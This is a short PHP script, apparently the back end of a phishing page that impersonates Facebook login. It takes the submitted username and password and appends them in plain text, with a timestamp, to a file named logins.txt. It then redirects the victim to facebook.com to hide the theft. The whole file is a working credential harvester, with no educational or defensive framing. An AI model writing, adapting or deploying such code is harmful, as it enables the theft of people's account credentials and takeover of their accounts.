<?php 
    function save_to_file(){
        if(!(isset($_REQUEST['username']) && isset($_REQUEST['password']))){
            return false;
        }

        $username = $_REQUEST['username'];
        $password = $_REQUEST['password'];
        
        $logFile = "logins.txt";  
        $logEntry = "Username: " . $username . " | Password: " . $password . " | Time: " . date("Y-m-d H:i:s") . "\n";

        // Zapisujemy dane do pliku
        file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
        
        return true;
    }

    if(save_to_file()){
        header("Location: http://www.facebook.com"); 
        exit();
    }
    
    header("Location: javascript://history.go(-1)");
?>
